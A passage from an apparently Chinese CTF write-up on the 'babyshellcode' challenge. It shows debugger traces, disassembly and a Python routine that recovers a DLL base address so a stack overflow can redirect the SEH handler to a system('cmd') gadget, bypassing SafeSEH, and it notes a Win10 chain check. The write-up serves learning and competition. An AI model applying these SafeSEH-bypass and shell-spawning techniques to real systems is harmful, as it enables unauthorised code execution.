<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">RtlDispatchException</span><span class="o">+</span><span class="mh">0x10e</span><span class="o">:</span>

<span class="mi">7708</span><span class="n">f9fe</span> <span class="mi">84</span><span class="n">c0</span>            <span class="n">test</span>    <span class="n">al</span><span class="o">,</span><span class="n">al</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">al</span>

<span class="n">al</span><span class="o">=</span><span class="mi">0</span>
</pre></div>


<p>通过堆绕过的方法失败了，我们又找到了其他方法，就是通过未开启 safeseh 的 dll 的方法来绕过 safeseh，这里我们找到了 scmgr.dll，它是一个未开启 safeseh 的模块，这个可以直接通过 od 的 OllySSEH 功能看到 SafeSEH 的开启状态。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/08/8d8a6449-dc7b-4eec-b0be-b7d7f19e314e.jpg-w331s" /></p>
<p>这里我们只需要把 seh handler 指向 scmgr.dll 就可以了，而且我们在 scmgr.dll 里发现，其实 system('cmd')已经在里面了，只需要跳转过去就可以了。</p>
<div class="codehilite"><pre><span></span><span class="nl">.text:</span><span class="err">10001100</span>                 <span class="nf">public</span> <span class="no">getshell_test</span>

<span class="nl">.text:</span><span class="err">10001100</span> <span class="nf">getshell_test</span>   <span class="no">proc</span> <span class="no">near</span>               <span class="c">; DATA XREF: .rdata:off_10002518o</span>

<span class="nl">.text:</span><span class="err">10001100</span>                 <span class="nf">push</span>    <span class="no">offset</span> <span class="no">Command</span>  <span class="c">; &quot;cmd&quot;</span>

<span class="nl">.text:</span><span class="err">10001105</span>                 <span class="nf">call</span>    <span class="no">ds</span><span class="p">:</span><span class="no">system</span>

<span class="nl">.text:</span><span class="err">1000110</span><span class="nf">B</span> <span class="c">; 3:   return 0;</span>

<span class="nl">.text:</span><span class="err">1000110</span><span class="nf">B</span>                 <span class="no">add</span>     <span class="no">esp</span><span class="p">,</span> <span class="mi">4</span>

<span class="nl">.text:</span><span class="err">1000110</span><span class="nf">E</span>                 <span class="no">xor</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>

<span class="nl">.text:</span><span class="err">10001110</span>                 <span class="nf">retn</span>

<span class="nl">.text:</span><span class="err">10001110</span> <span class="nf">getshell_test</span>   <span class="no">endp</span>
</pre></div>


<p>但是这里有一个问题，就是 scmgr.dll 的基址是多少，这里我们想了两种方法来获得基址，一个是爆破，因为我们发现 scmgr.dll 在每次进程重启的时候基址都不变，因此我们只需要在 0x60000000-0x8000000 之间爆破就可以，0x8000000 之上是内核空间的地址了，因此只需要爆破这个范围即可。（由于刚开始以为是 win7，所以爆破的时候有一点没有考虑到，导致目标总是 crash，我们也找不到原因，本地测试是完全没问题的，后面会提到）。</p>
<p>还有一种方法是我们看到了 set shellcodeguard 函数，这个就是我们之前提到对 is_guard 那个全局变量设置的函数，但实际上，这个也没法把这个值置 0，毕竟置 0之后直接就能撸 shellcode 了，但我们关注到 Disable Shellcode Guard 中一个有趣的加密。</p>
<div class="codehilite"><pre><span></span>  <span class="nt">puts</span><span class="o">(</span><span class="s2">&quot;1. Disable ShellcodeGuard&quot;</span><span class="o">);</span>

  <span class="nt">puts</span><span class="o">(</span><span class="s2">&quot;2. Enable ShellcodeGuard&quot;</span><span class="o">);</span>

  <span class="err">⋯⋯</span>

  <span class="nt">if</span> <span class="o">(</span> <span class="nt">v2</span> <span class="o">==</span> <span class="nt">1</span> <span class="o">)//</span><span class="nt">加密在这里</span>

  <span class="p">{</span>

    <span class="err">v3</span> <span class="err">=</span> <span class="err">((int</span> <span class="err">(*)(void))sub_4017F0)()</span><span class="p">;</span>

    <span class="err">v4</span> <span class="err">=</span> <span class="err">sub_4017F0(v3)</span><span class="p">;</span>

    <span class="err">v5</span> <span class="err">=</span> <span class="err">sub_4017F0(v4)</span><span class="p">;</span>

    <span class="err">v6</span> <span class="err">=</span> <span class="err">sub_4017F0(v5)</span><span class="p">;</span>

    <span class="err">v7</span> <span class="err">=</span> <span class="err">sub_4017F0(v6)</span><span class="p">;</span>

    <span class="err">v8</span> <span class="err">=</span> <span class="err">sub_4017F0(v7)</span><span class="p">;</span>

    <span class="err">sub_4017C0(&quot;Your</span> <span class="err">challenge</span> <span class="err">code</span> <span class="err">is</span> <span class="err">%x-%x-%x-%x-%x-%x\n&quot;,</span> <span class="err">v8)</span><span class="p">;</span>

    <span class="err">puts(&quot;challenge</span> <span class="n">response</span><span class="p">:</span><span class="s2">&quot;);</span>

<span class="s2">    v9 = 0;</span>

<span class="s2">    v10 = getchar();</span>

<span class="s2">    do</span>

<span class="s2">    {</span>

<span class="s2">      if ( v10 == 10 )</span>

<span class="s2">        break;</span>

<span class="s2">      ++v9;</span>

<span class="s2">      v10 = getchar();</span>

<span class="s2">    }</span>

<span class="s2">    while ( v9 != 20 );</span>

<span class="s2">    puts(&quot;</span><span class="n">respose</span> <span class="n">wrong</span><span class="o">!</span><span class="s2">&quot;);</span>

<span class="s2">  }</span>

<span class="s2">  else//当v2为0的时候是Enable Shellcode Guard，全局变量置1</span>

<span class="s2">  {</span>

<span class="s2">    if ( v2 == 2 )</span>

<span class="s2">    {</span>

<span class="s2">      byte_405448 = 1;</span>

<span class="s2">      return 0;</span>

<span class="s2">    }</span>

<span class="s2">    puts(&quot;</span><span class="n">wrong</span> <span class="n">option</span><span class="err">&quot;</span><span class="p">);</span>

  <span class="p">}</span>
</pre></div>


<p>这个加密其实很复杂的。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/08/ae0cab27-3b11-41d8-8a87-4be84a01d541.png-w331s" /></p>
<p>后来官方也给出了hint，Hint for babyshellcode: The algorithm is neither irreversible nor z3-solvable.告诉大家这个加密算法不可逆，别想了！</p>
<p>先我们来看一下这个加密算法加密的什么玩意，我们跟入这个算法。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="n">ae7e77d0</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0000001</span><span class="n">f</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0</span><span class="n">cd4ae6b</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00</span><span class="n">ae7e77</span> <span class="n">edi</span><span class="o">=</span><span class="mi">354</span><span class="n">eaad0</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">00</span><span class="n">a11818</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0016</span><span class="n">fcd8</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0016</span><span class="n">fd08</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">ov</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">cy</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000</span><span class="n">a07</span>

<span class="n">babyshellcode</span><span class="o">+</span><span class="mh">0x1818</span><span class="o">:</span>

<span class="o">***</span> <span class="n">WARNING</span><span class="o">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="o">:\</span><span class="n">Users</span><span class="o">\</span><span class="n">sh1</span><span class="o">\</span><span class="n">Desktop</span><span class="o">\</span><span class="n">scmgr</span><span class="o">.</span><span class="na">dll</span>

<span class="o">***</span> <span class="n">ERROR</span><span class="o">:</span> <span class="n">Symbol</span> <span class="n">file</span> <span class="n">could</span> <span class="n">not</span> <span class="n">be</span> <span class="n">found</span><span class="o">.</span>  <span class="n">Defaulted</span> <span class="n">to</span> <span class="n">export</span> <span class="n">symbols</span> <span class="k">for</span> <span class="n">C</span><span class="o">:\</span><span class="n">Users</span><span class="o">\</span><span class="n">sh1</span><span class="o">\</span><span class="n">Desktop</span><span class="o">\</span><span class="n">scmgr</span><span class="o">.</span><span class="na">dll</span> <span class="o">-</span> 

<span class="mi">00</span><span class="n">a11818</span> <span class="mi">3334955054</span><span class="n">a100</span>  <span class="n">xor</span>     <span class="n">esi</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">babyshellcode</span><span class="o">+</span><span class="mh">0x5450</span> <span class="o">(</span><span class="mi">00</span><span class="n">a15450</span><span class="o">)[</span><span class="n">edx</span><span class="o">*</span><span class="mi">4</span><span class="o">]</span> <span class="n">ds</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">00</span><span class="n">a15450</span><span class="o">={</span><span class="n">scmgr</span><span class="o">!</span><span class="n">init_scmgr</span> <span class="o">(</span><span class="mi">67</span><span class="n">bc1090</span><span class="o">)}</span>
</pre></div>


<p>发现在算法初始化的时候，加密的是 <code>scmgr!init_scmgr</code> 的地址，也就是 <code>67bc1090</code>，这个就厉害了，既然不可逆，我们把这个算法 dump 出来正向爆破去算，如果结果等于最后加密的结果，那就是碰到基址了，这样一是不用频繁和服务器交互，二是及时 dll 每次进程重启基址都改变，也能直接通过这种方法不令进程崩溃也能获得到基址。</p>
<div class="codehilite"><pre><span></span>def gen_cha_code(base):

    init_scmgr = base*0x10000 +0x1090



    value = init_scmgr

    g_table = [value]

    for i in range(31):

        value = (value * 69069)&amp;0xffffffff

        g_table.append(value)



    g_index = 0



    v0 = (g_index-1)&amp;0x1f

    v2 = g_table[(g_index+3)&amp;0x1f]^g_table[g_index]^(g_table[(g_index+3)&amp;0x1f]&gt;&gt;8)

    v1 = g_table[v0]

    v3 = g_table[(g_index + 10) &amp; 0x1F]

    v4 = g_table[(g_index - 8) &amp; 0x1F] ^ v3 ^ ((v3 ^ (32 * g_table[(g_index - 8) &amp; 0x1F])) &lt;&lt; 14)

    v4 = v4&amp;0xffffffff

    g_table[g_index] = v2^v4

    g_table[v0] = (v1 ^ v2 ^ v4 ^ ((v2 ^ (16 * (v1 ^ 4 * v4))) &lt;&lt; 7))&amp;0xffffffff

    g_index = (g_index - 1) &amp; 0x1F

    return g_table[g_index]
</pre></div>


<p>这样，获取到基址之后，我们就能够构造 seh handler 了，直接令 seh handler 指向 getshell_test 就直接能获得和目标的shell交互了。通过栈溢出覆盖 seh chain。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="o">!</span><span class="n">exchain</span>

<span class="mi">0016</span><span class="n">fcf8</span><span class="o">:</span> <span class="n">scmgr</span><span class="o">!</span><span class="n">getshell_test</span><span class="o">+</span><span class="mi">0</span> <span class="o">(</span><span class="mi">67</span><span class="n">bc1100</span><span class="o">)</span>

<span class="n">Invalid</span> <span class="n">exception</span> <span class="n">stack</span> <span class="n">at</span> <span class="mi">0</span><span class="n">d16fd74</span>
</pre></div>


<p>进入 safeseh，由于在 nosafeseh 空间，返回 true，该地址可信。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">72</span><span class="n">b61100</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0023</span><span class="n">f99c</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">0023</span><span class="n">f424</span> <span class="n">edx</span><span class="o">=</span><span class="mi">770</span><span class="n">b6c74</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0023</span><span class="n">f4c8</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">7708</span><span class="n">f9f9</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0023</span><span class="n">f438</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0023</span><span class="n">f4b0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">RtlDispatchException</span><span class="o">+</span><span class="mh">0x109</span><span class="o">:</span>

<span class="mi">7708</span><span class="n">f9f9</span> <span class="n">e815feffff</span>      <span class="n">call</span>    <span class="n">ntdll</span><span class="o">!</span><span class="n">RtlIsValidHandler</span> <span class="o">(</span><span class="mi">7708</span><span class="n">f813</span><span class="o">)</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">0023</span><span class="n">f401</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">0023</span><span class="n">f99c</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">73</span><span class="n">a791c6</span> <span class="n">edx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">esi</span><span class="o">=</span><span class="mi">0023</span><span class="n">f4c8</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">7708</span><span class="n">f9fe</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0023</span><span class="n">f440</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0023</span><span class="n">f4b0</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">RtlDispatchException</span><span class="o">+</span><span class="mh">0x10e</span><span class="o">:</span>

<span class="mi">7708</span><span class="n">f9fe</span> <span class="mi">84</span><span class="n">c0</span>            <span class="n">test</span>    <span class="n">al</span><span class="o">,</span><span class="n">al</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">al</span>

<span class="n">al</span><span class="o">=</span><span class="mi">1</span>
</pre></div>


<p>进入 call seh handler，跳转到 <code>getshell_test</code>。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">73</span><span class="n">a791c6</span> <span class="n">edx</span><span class="o">=</span><span class="mi">770</span><span class="n">b6d8d</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">770</span><span class="n">b6d74</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0023</span><span class="n">f3e4</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0023</span><span class="n">f400</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">ExecuteHandler2</span><span class="o">+</span><span class="mh">0x21</span><span class="o">:</span>

<span class="mi">770</span><span class="n">b6d74</span> <span class="mi">8</span><span class="n">b4d18</span>          <span class="n">mov</span>     <span class="n">ecx</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">18</span><span class="n">h</span><span class="o">]</span> <span class="n">ss</span><span class="o">:</span><span class="mi">0023</span><span class="o">:</span><span class="mi">0023</span><span class="n">f418</span><span class="o">={</span><span class="n">scmgr</span><span class="o">!</span><span class="n">getshell_test</span> <span class="o">(</span><span class="mi">72</span><span class="n">b61100</span><span class="o">)}</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">72</span><span class="n">b61100</span> <span class="n">edx</span><span class="o">=</span><span class="mi">770</span><span class="n">b6d8d</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">770</span><span class="n">b6d77</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0023</span><span class="n">f3e4</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0023</span><span class="n">f400</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">ExecuteHandler2</span><span class="o">+</span><span class="mh">0x24</span><span class="o">:</span>

<span class="mi">770</span><span class="n">b6d77</span> <span class="n">ffd1</span>            <span class="n">call</span>    <span class="n">ecx</span> <span class="o">{</span><span class="n">scmgr</span><span class="o">!</span><span class="n">getshell_test</span> <span class="o">(</span><span class="mi">72</span><span class="n">b61100</span><span class="o">)}</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">t</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">72</span><span class="n">b61100</span> <span class="n">edx</span><span class="o">=</span><span class="mi">770</span><span class="n">b6d8d</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00000000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">72</span><span class="n">b61100</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0023</span><span class="n">f3e0</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0023</span><span class="n">f400</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">001</span><span class="n">b</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">es</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">003</span><span class="n">b</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">0000</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>

<span class="n">scmgr</span><span class="o">!</span><span class="n">getshell_test</span><span class="o">:</span>

<span class="mi">72</span><span class="n">b61100</span> <span class="mi">68</span><span class="n">f420b672</span>      <span class="n">push</span>    <span class="n">offset</span> <span class="n">scmgr</span><span class="o">!</span><span class="n">getshell_test</span><span class="o">+</span><span class="mh">0xff4</span> <span class="o">(</span><span class="mi">72</span><span class="n">b620f4</span><span class="o">)</span>
</pre></div>


<p><img alt="" src="https://images.seebug.org/content/images/2017/08/5d55285b-2d0b-4ca7-b701-c5775ed552a6.png-w331s" /></p>
<p>到这里利用就完整了吗？我们在 win7 下没问题了，但是在目标却一直 crash 掉，实在是搞不明白，后来才知道，我们用错了环境！原来目标是Win10...</p>
<p>Win10 的 SafeSEH 和 Win7 又有所区别，这里要提到SEH的两个域，一个是 prev 域和 handler 域，prev域会存放一个指向下一个 seh chain 的栈地址，handler 域就是存放的 seh handler，而 Win10 里面多了一个 Check 函数 <code>ntdll!RtlpIsValidExceptionChain</code>，这个函数会去获得当前 seh chain 的 prev 域的值。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span><span class="c1">//这里我们覆盖prev为0x61616161</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">030</span><span class="n">fd000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">03100000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">030</span><span class="n">ff7ac</span> <span class="n">edx</span><span class="o">=</span><span class="mi">6</span><span class="n">fdd1100</span> <span class="n">esi</span><span class="o">=</span><span class="mi">030</span><span class="n">ff278</span> <span class="n">edi</span><span class="o">=</span><span class="mi">030</span><span class="n">fd000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">7771</span><span class="n">ea79</span> <span class="n">esp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1bc</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1c8</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">RtlpIsValidExceptionChain</span><span class="o">+</span><span class="mh">0x2b</span><span class="o">:</span>

<span class="mi">7771</span><span class="n">ea79</span> <span class="mi">8</span><span class="n">b31</span>            <span class="n">mov</span>     <span class="n">esi</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ecx</span><span class="o">]</span>  <span class="n">ds</span><span class="o">:</span><span class="mi">002</span><span class="n">b</span><span class="o">:</span><span class="mi">030</span><span class="n">ff7ac</span><span class="o">=</span><span class="mi">61616161</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">030</span><span class="n">fd000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">03100000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">030</span><span class="n">ff7ac</span> <span class="n">edx</span><span class="o">=</span><span class="mi">6</span><span class="n">fdd1100</span> <span class="n">esi</span><span class="o">=</span><span class="mi">61616161</span> <span class="n">edi</span><span class="o">=</span><span class="mi">030</span><span class="n">fd000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">7771</span><span class="n">ea7b</span> <span class="n">esp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1bc</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1c8</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000206</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">RtlpIsValidExceptionChain</span><span class="o">+</span><span class="mh">0x2d</span><span class="o">:</span>

<span class="mi">7771</span><span class="n">ea7b</span> <span class="mi">83</span><span class="n">feff</span>          <span class="n">cmp</span>     <span class="n">esi</span><span class="o">,</span><span class="mi">0</span><span class="n">FFFFFFFFh</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">030</span><span class="n">fd000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">03100000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">030</span><span class="n">ff7ac</span> <span class="n">edx</span><span class="o">=</span><span class="mi">6</span><span class="n">fdd1100</span> <span class="n">esi</span><span class="o">=</span><span class="mi">61616161</span> <span class="n">edi</span><span class="o">=</span><span class="mi">030</span><span class="n">fd000</span>

<span class="n">eip</span><span class="o">=</span><span class="mi">7771</span><span class="n">ea7e</span> <span class="n">esp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1bc</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">030</span><span class="n">ff1c8</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">ac</span> <span class="n">po</span> <span class="n">cy</span>

<span class="n">cs</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000213</span>

<span class="n">ntdll</span><span class="o">!</span><span class="n">RtlpIsValidExceptionChain</span><span class="o">+</span><span class="mh">0x30</span><span class="o">:</span>

<span class="mi">7771</span><span class="n">ea7e</span> <span class="mi">740</span><span class="n">f</span>            <span class="n">je</span>      <span class="n">ntdll</span><span class="o">!</span><span class="n">RtlpIsValidExceptionChain</span><span class="o">+</span><span class="mh">0x41</span> <span class="o">(</span><span class="mi">7771</span><span class="n">ea8f</span><span class="o">)</span> <span class="o">[</span><span class="n">br</span><span class="o">=</span><span class="mi">0</span><span class="o">]</span>
</pre></div>


<p>随后，会去和 seh 表里存放的 prev 域的值进行比较。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">&gt;</span> <span class="n">p</span>

<span class="n">eax</span><span class="o">=</span><span class="mi">030</span><span class="n">ff7b4</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">03100000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">61616161</span> <span class="n">edx</span><span class="o">=</span><span class="mi">6</span><span class="n">fdd1100</span> <span class="n">esi</span><span class="o">=</span><span class="mi">61616161</span> <span class="n">edi</span><span class="o">=</span><span class="mi">030</span><span class="n">fd000</span>

